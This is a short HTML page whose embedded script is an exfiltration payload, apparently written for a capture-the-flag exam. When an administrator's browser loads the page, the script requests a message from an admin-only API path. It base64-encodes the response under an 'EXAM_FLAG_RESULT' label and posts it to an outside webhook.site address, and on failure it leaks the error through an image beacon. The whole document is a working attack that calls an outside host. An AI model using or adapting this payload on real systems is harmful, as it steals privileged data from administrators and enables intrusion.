<!DOCTYPE html>
<html>
<body>
    <script>
        // Use the successful path and your NEW message ID
        const targetPath = '/api/admin/messages/69ea97eabee6d6b7c664653e7';
        const myWebhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';

        fetch(targetPath)
            .then(response => response.text())
            .then(data => {
                // Send the result to your new webhook
                fetch(myWebhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: btoa('EXAM_FLAG_RESULT:' + data)
                });
            })
            .catch(err => {
                // Log if the admin can't reach the API from your link
                new Image().src = myWebhook + '?error=' + btoa(err.message);
            });
    </script>
</body>
</html>
